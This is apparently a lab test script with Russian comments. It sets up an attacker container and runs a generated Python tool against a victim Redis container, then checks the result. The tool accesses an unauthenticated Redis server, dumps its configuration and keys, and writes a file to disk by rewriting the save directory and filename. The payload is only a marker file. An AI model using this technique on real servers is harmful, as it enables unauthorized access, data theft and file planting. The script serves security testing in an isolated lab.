#!/bin/bash
set -e

echo "=== Шаг 1: Создание виртуального окружения Python в контейнере attacker ==="
docker exec attacker bash -c "cd /root && python3 -m venv venv"
echo "Виртуальное окружение создано"

echo ""
echo "=== Шаг 2: Активация виртуального окружения и установка зависимостей ==="
docker exec attacker bash -c "cd /root && source venv/bin/activate && pip3 install redis"
echo "Зависимости установлены"

echo ""
echo "=== Шаг 3: Создание файла redis_attack.py ==="
docker exec attacker bash -c 'cat > /root/redis_attack.py << '\''EOFSCRIPT'\''
#!/usr/bin/env python3
import redis
import sys

def attack_redis(host, port):
    """
    Комплексная атака на незащищенный Redis:
    - Проверка подключения
    - Сбор версии и конфигурации
    - Запись тестового файла в /tmp через RDB
    - Вывод найденных ключей
    """
    try:
        r = redis.Redis(host=host, port=port, decode_responses=True)
        
        # Проверка подключения
        print(f"[+] Подключение к Redis {host}:{port}")
        r.ping()
        print("[+] Подключение успешно!")
        
        # Информация о сервере
        info = r.info('server')
        print(f"[+] Redis версия: {info.get(\"redis_version\", \"unknown\")}")
        print(f"[+] ОС: {info.get(\"os\", \"unknown\")}")
        
        # Конфигурация
        cfg = r.config_get('*')
        print(f"[+] Текущая директория: {cfg.get(\"dir\", \"N/A\")}")
        print(f"[+] Имя файла БД: {cfg.get(\"dbfilename\", \"N/A\")}")
        print(f"[+] Пароль: {\"НЕТ\" if not cfg.get(\"requirepass\", \"\") else \"УСТАНОВЛЕН\"}")
        
        # Запись тестового файла в /tmp
        r.config_set('dir', '/tmp')
        r.config_set('dbfilename', 'redis_test.txt')
        r.set('payload', 'Redis compromised by attacker!')
        r.set('indicator', 'SYSTEM_COMPROMISED_BY_REDIS_ATTACK')
        r.save()
        print("[+] Тестовый файл записан в /tmp/redis_test.txt")
        
        # Вывод содержимого БД
        keys = r.keys('*')
        print(f"[+] Найдено ключей в БД: {len(keys)}")
        for key in keys[:10]:
            try:
                print(f" - {key}: {r.get(key)}")
            except Exception:
                print(f" - {key}: <non-string value>")
                
    except Exception as e:
        print(f"[-] Ошибка: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Использование: python3 redis_attack.py <host> <port>")
        print("Пример: python3 redis_attack.py 172.20.0.102 6379")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    attack_redis(host, port)
EOFSCRIPT
'
echo "Файл redis_attack.py создан"

echo ""
echo "=== Шаг 4: Запуск атаки на Redis ==="
docker exec attacker bash -c "cd /root && source venv/bin/activate && python3 redis_attack.py 172.20.0.102 6379"
echo ""

echo "=== Шаг 5: Проверка результата атаки ==="
echo "Проверка файла /tmp/redis_test.txt в контейнере victim-redis:"
docker exec victim-redis ls -la /tmp/redis_test.txt 2>/dev/null && echo "Файл найден!" || echo "Файл не найден"
if docker exec victim-redis test -f /tmp/redis_test.txt 2>/dev/null; then
    echo "Содержимое файла:"
    docker exec victim-redis cat /tmp/redis_test.txt 2>/dev/null || echo "Не удалось прочитать файл"
fi

echo ""
echo "=== Тест завершен ==="
